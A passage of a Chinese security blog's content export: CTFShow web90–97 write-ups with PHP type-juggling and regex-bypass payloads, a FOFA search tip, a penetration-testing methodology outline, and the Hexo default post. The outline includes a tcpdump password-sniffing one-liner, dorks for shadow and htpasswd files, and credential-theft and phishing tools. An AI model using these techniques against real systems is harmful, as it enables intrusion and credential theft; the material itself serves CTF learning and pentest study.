class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">== ===缺陷绕过 == 弱类型对比 ===还会比较类型</span><br></pre></td></tr></table></figure><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>强类型比较   把4476转换成十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a><img src="/.git//Users\19504\AppData\Roaming\Typora\typora-user-images\image-20220410180533122.png" alt="image-20220410180533122"><img src="/.git//img.png" alt="img.png"></h3><h3 id="web91："><a href="#web91：" class="headerlink" title="web91："></a>web91：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>preg_match先看这个函数：preg_match 函数用于执行一个正则表达式匹配。</p><p>看第一个if匹配php，第二个if匹配到php输出hacker，要输出第三个else则需要绕过第二个if，用正则表达式来绕过</p><blockquote><p><strong>&#x2F;i表示匹配大小写</strong><br><strong>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾</strong><br><strong>&#x2F;m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配</strong><br><strong>但是当出现换行符 <code>%0a</code>的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=%0aphp</span><br></pre></td></tr></table></figure><h3 id="web92："><a href="#web92：" class="headerlink" title="web92："></a>web92：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较，十六进制可绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.1</span><br><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><h3 id="web93"><a href="#web93" class="headerlink" title="web93:"></a>web93:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">  $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">  if($num==4476)&#123;</span><br><span class="line">    die(&quot;no no no!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">    die(&quot;no no no!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if(intval($num,0)==4476)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo intval($num,0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到过滤了[a-z]，和上题一样，用浮点数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nmu=4476.1</span><br></pre></td></tr></table></figure><h3 id="web94："><a href="#web94：" class="headerlink" title="web94："></a>web94：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>&#x3D;&#x3D;&#x3D;   强类型比较，绕过去之后preg_match[a-z]&#x2F;i，第三个if出现了一个函数strpos</p><p><img src="/.git//Users\19504\AppData\Roaming\Typora\typora-user-images\image-20220410181801815.png" alt="image-20220410181801815"></p><p><strong>因为八进制需要开头指定为0，而strpos()会匹配到返回0，!0也就是1得执行die，我们可以在前面加个空格，这样strpos()会返回1，所以我们把4476转换为8进制10574后，前面再加一个空格即可，payload为</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">还一种思路：?num=4476.0</span><br></pre></td></tr></table></figure><h3 id="web95："><a href="#web95：" class="headerlink" title="web95："></a>web95：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较，思路一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br></pre></td></tr></table></figure><h3 id="web96："><a href="#web96：" class="headerlink" title="web96："></a>web96：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型，读取flag.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure><h3 id="web97："><a href="#web97：" class="headerlink" title="web97："></a>web97：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>POST发包输出个a再输出个b且强类型比较md5加密了，两个NULL值相等即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">a[]=1&amp;bp[]=2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFShow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA挖洞小妙招</title>
      <link href="/2022/06/17/FOFA%E6%8C%96%E6%B4%9E%E5%B0%8F%E5%A6%99%E6%8B%9B/"/>
      <url>/2022/06/17/FOFA%E6%8C%96%E6%B4%9E%E5%B0%8F%E5%A6%99%E6%8B%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加上is_domain=true这个条件，搜出来的就都是有域名的了</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FOFA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试(水文，勿看)</title>
      <link href="/2022/06/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4/"/>
      <url>/2022/06/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h1><ul><li>Reconnaissance（侦察）<ul><li>Passive&#x2F;Semi-Passive（被动&#x2F;半被动信息收集）<ul><li>Third Party Resources（第三方资源们）<ul><li>Locate Target Range<ul><li>ARIN - <a href="https://www.arin.net/">https://www.arin.net/</a></li></ul></li><li>Fingerprint Domain&#x2F;Website（收集域名&#x2F;网站指纹）<ul><li>360 - <a href="https://quake.360.cn/quake/">https://quake.360.cn/quake/</a></li><li>FOFA - <a href="https://fofa.info/">https://fofa.info/</a></li><li>Shodan - <a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>Censys - <a href="https://www.censys.io/">https://www.censys.io/</a></li><li>Zoomeye - <a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></li><li>Netcraft - <a href="https://www.netcraft.com/">https://www.netcraft.com/</a></li><li>Extended Network Information（加强版网络信息）<ul><li>Central Ops - <a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a></li><li>Robtex - <a href="https://www.robtex.net/">https://www.robtex.net/</a></li></ul></li><li>Metasploit Scanning（Metasploit扫描）<ul><li>auxiliary&#x2F;scanner&#x2F;*<ul><li>portscan&#x2F;tcp</li><li>http&#x2F;http_version</li><li>http&#x2F;tomcat_enum</li><li>http&#x2F;trace_axd<ul><li>Google - site:<result from above> filetype:axd OR inurl:trace.axd</result></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>Command Line Recon（命令行侦察）<ul><li>Network Information （网络信息）<ul><li>nslookup <target><ul><li>DNS cache snooping</li></ul></target></li><li>dig <target></target></li></ul></li><li>Security Mechanisms （安全机制）<ul><li>halberd</li></ul></li><li>Metadata（元数据）<ul><li>exiftool</li><li>strings<ul><li>strings -e b (big endian) OR -e l (little endian)</li></ul></li></ul></li></ul></li><li>People Search（搜人）<ul><li>Yahoo People Search - <a href="http://itools.com/tool/yahoo-people-search">http://itools.com/tool/yahoo-people-search</a></li><li>Switchboard - <a href="http://www.switchboard.com/person">http://www.switchboard.com/person</a></li><li>Google Finance - <a href="https://www.google.com/finance">https://www.google.com/finance</a></li><li>Zaba - <a href="http://www.zabasearch.com/">http://www.zabasearch.com/</a></li></ul></li></ul></li><li>Active（主动信息收集）<ul><li>Command Line Recon Tools（命令行侦察工具们）<ul><li>General Recon（通用侦察手段）<ul><li>Recon-NG<ul><li>Automated with <a href="https://github.com/jhaddix/domain">https://github.com/jhaddix/domain</a></li></ul></li><li>Domain&#x2F;Subdomain Information（域名&#x2F;子域名信息）<ul><li>Fierce</li><li>The Harvester</li><li>Dirb</li><li>Dirbuster</li></ul></li></ul></li><li>Nmap<ul><li>nmap -Pn -sSU -sV –top-ports 20 <target></target></li></ul></li><li>Create Custom Worldlist（建立自定义字典）<ul><li>cewl - <a href="https://digi.ninja/projects/cewl.php">https://digi.ninja/projects/cewl.php</a></li><li>wget - <a href="http://wiki.securityweekly.com/wiki/index.php/Episode129">http://wiki.securityweekly.com/wiki/index.php/Episode129</a></li></ul></li></ul></li><li>Software（软件们）<ul><li>FOCA</li><li>SPARTA</li><li>Maltego</li><li>Dirbuster</li></ul></li></ul></li><li>Browser Extensions（浏览器插件们）<ul><li>Chrome</li><li>Firefox</li><li>Safari</li></ul></li><li>Google Searching（Google高级搜索）<ul><li>site:”target name” jobs,careers,openings,etc</li><li>intitle:”index of <Keyword>“<ul><li>Keyword<ul><li>.bash_history</li><li>etc&#x2F;shadow</li><li>finances.xls(x)</li><li>htpasswd</li><li>inurl:maillog</li></ul></li></ul></Keyword></li><li>site:<em>.edu filetype:</em>.bak OR <keyword><ul><li>Keyword<ul><li>*.conf</li><li>*.backup</li></ul></li></ul></keyword></li></ul></li></ul></li><li>Enumeration（信息枚举）<ul><li>Internal（内部网络）<ul><li>Scanning（扫描）<ul><li>Map Internal Network（建立内网拓扑）<ul><li>Command Line Tools（命令行工具们）<ul><li>arp -a</li><li>ip neigh show</li><li>smbtree -NS 2&gt;&#x2F;dev&#x2F;null</li><li>nbtscan -r <current_IPrange></current_IPrange></li><li>netdiscover -r <current_IPrange></current_IPrange></li><li>nmap -n -Pn -T5 -sS <current_IPrange><ul><li>nmap NSE scripts<ul><li>NFS</li><li>SMB</li></ul></li></ul></current_IPrange></li></ul></li></ul></li></ul></li><li>Pivoting（跳板&#x2F;转发）<ul><li>SSH Proxy Tunneling with Proxychain<ul><li><a href="http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html">http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html</a></li></ul></li></ul></li></ul></li><li>External（外部网络）<ul><li>Scanning（扫描）<ul><li>Nmap</li><li>Unicornscan</li><li>OneTwoPunch<ul><li>Combines nmap and unicorn scan <a href="https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh">https://github.com/superkojiman/onetwopunch/blob/master/onetwopunch.sh</a></li></ul></li></ul></li></ul></li></ul></li><li>Exploitation（漏洞利用）<ul><li>External（外部网络）<ul><li>Web Vulnerability Scanners（Web漏洞扫描器们）<ul><li>Burp<ul><li><a href="https://portswigger.net/burp/">https://portswigger.net/burp/</a></li><li>My Guide: <a href="http://pastebin.com/nNHYP9Jd">http://pastebin.com/nNHYP9Jd</a></li></ul></li><li>Wapiti<ul><li><a href="http://wapiti.sourceforge.net/">http://wapiti.sourceforge.net/</a></li></ul></li><li>w3af<ul><li><a href="http://w3af.org/">http://w3af.org/</a></li></ul></li><li>Nikto<ul><li><a href="https://cirt.net/Nikto2">https://cirt.net/Nikto2</a></li></ul></li></ul></li><li>Framework（框架）<ul><li>web2attack<ul><li><a href="https://github.com/santatic/web2attack">https://github.com/santatic/web2attack</a></li></ul></li></ul></li><li>Command Line Tools（命令行工具们）<ul><li>CMSmap<ul><li><a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></li></ul></li><li>WPscan<ul><li><a href="https://wpscan.org/">https://wpscan.org/</a></li></ul></li><li>Joomscan<ul><li><a href="https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project">https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project</a></li></ul></li></ul></li></ul></li><li>Internal（内部网络）<ul><li>LAN Attacks（LAN攻击）<ul><li>Local Python Server -<ul><li>Serve Shells&#x2F;Exploits（建立Shell和Exploits下载站）<ul><li>python -m SimpleHTTPServer <port></port></li><li>python3 -m http.server <port></port></li><li>php -S <host>:<port></port></host></li></ul></li><li>LLMNR&#x2F;NBT-NS Poisoning（LLMNR&#x2F;NBT-NS投毒）<ul><li>Responder - <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a><ul><li>Listen&#x2F;respond to LLMNR NBTNS requests</li></ul></li></ul></li></ul></li></ul></li><li>Local Vulnerability Scanning（本地漏洞扫描）<ul><li>LinEnum- <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>Unix-privesc-check</li><li>Linux_Exploit_Suggester</li></ul></li><li>Comprehensive Linux Enumeration（详细，全面的Linux枚举）<ul><li><a href="http://www.rebootuser.com/?p=1623">http://www.rebootuser.com/?p=1623</a></li></ul></li><li>Bypass AV（反病毒软件绕过）<ul><li>PowerSploit - Python Powershell Shell<ul><li><a href="https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/">https://www.hackingloops.com/powersploit-quick-shell-for-penetration-testing/</a></li></ul></li><li>Download Files via Command Line（通过命令行下载文件）<ul><li><a href="https://www.greyhathacker.net/?p=500">https://www.greyhathacker.net/?p=500</a></li></ul></li></ul></li><li>Reverse Shells（反向Shell）<ul><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li><li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li></ul></li><li>Attack Tools（攻击工具）<ul><li>Responder - <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li><li>SMBExec - <a href="https://github.com/pentestgeek/smbexec">https://github.com/pentestgeek/smbexec</a></li><li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li></ul></li></ul></li></ul></li><li>Post-Exploitation（后渗透阶段）<ul><li>Comprehensive Wiki<ul><li><a href="http://pwnwiki.io/#!index.md">http://pwnwiki.io/#!index.md</a></li></ul></li><li>Pivoting（跳板&#x2F;平移）<ul><li>Stealing Hashes（窃取hashes）<ul><li>WCE - <a href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></li></ul></li><li>Password Sniffing（密码嗅探）<ul><li>Tcpdump<ul><li>tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i ‘pass&#x3D;|pwd&#x3D;|log&#x3D;|login&#x3D;|user&#x3D;|username&#x3D;|pw&#x3D;|passw&#x3D;|passwd&#x3D;|password&#x3D;||name&#x3D;|name:|pass:|user:|username:|password:|login:|pass |user ‘ –color&#x3D;auto –line-</li></ul></li><li>Ngrep<ul><li>ngrep -q -W byline “GET|POST HTTP”</li></ul></li><li>Dsniff<ul><li>dsniff -m</li></ul></li></ul></li></ul></li><li>Attack Frameworks&#x2F;Tools（攻击框架&#x2F;工具）<ul><li>Empire<ul><li><a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></li></ul></li><li>Armitage<ul><li><a href="http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/">http://blog.cobaltstrike.com/2016/05/25/raffis-abridged-guide-to-cobalt-strike/</a></li></ul></li><li>Privilege Escalation（权限提升）<ul><li>PowerSploit - <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li></ul></li></ul></li><li>Download Files via Command Line（通过命令行下载文件）<ul><li><a href="https://www.greyhathacker.net/?p=500">https://www.greyhathacker.net/?p=500</a></li></ul></li><li>Information Gathering（信息收集）<ul><li>LinEnum - <a href="http://www.rebootuser.com/?p=1758">http://www.rebootuser.com/?p=1758</a></li><li>privilege-escalation-awesome-scripts-suite - <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></li></ul></li></ul></li><li>Exfiltration（撤出）<ul><li>Detection Capabilities（探测能力）<ul><li>Egress-Assess<ul><li><a href="https://github.com/ChrisTruncer/Egress-Assess">https://github.com/ChrisTruncer/Egress-Assess</a></li></ul></li><li>Outbound Port Detection (find unfiltered outbound connections)（探测出端口，指找到未被过滤的出口连接）<ul><li><a href="http://www.floyd.ch/?p=352">http://www.floyd.ch/?p=352</a></li></ul></li></ul></li><li>Network Exfiltration（网络撤出）</li></ul></li><li>Phishing（钓鱼）<ul><li>Important: Immediately pivot from initial host（重要：应尽快从最初入侵的主机跳转&#x2F;平移出去）</li><li>Tools（工具们）<ul><li>Empire<ul><li><a href="https://enigma0x3.net/2016/03/15/phishing-with-empire/">https://enigma0x3.net/2016/03/15/phishing-with-empire/</a></li></ul></li><li>Gophish<ul><li><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></li></ul></li></ul></li><li>Initial Access Techniques（建立初始入侵的技术们）<ul><li>Office Macros</li></ul></li><li>Tools for Internal Use（内部使用的工具）<ul><li>PowerView - stealuserhunter</li></ul></li></ul></li><li>Misc.（杂项）<ul><li>Find Exploits（查找漏洞利用）<ul><li>Linux<ul><li>Command line<ul><li>searchsploit -e Windows 7<ul><li>searchsploit windows 2007 | grep -i local</li></ul></li></ul></li></ul></li><li>Web<ul><li>Exploit-db<ul><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li></ul></li><li>Packet Storm<ul><li><a href="https://packetstormsecurity.com/files/tags/exploit">https://packetstormsecurity.com/files/tags/exploit</a></li></ul></li></ul></li></ul></li><li>Various Automation（各种自动化工具）<ul><li><a href="https://github.com/leebaird/discover">https://github.com/leebaird/discover</a></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/05/18/hello-world/"/>
      <url>/2022/05/18/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote 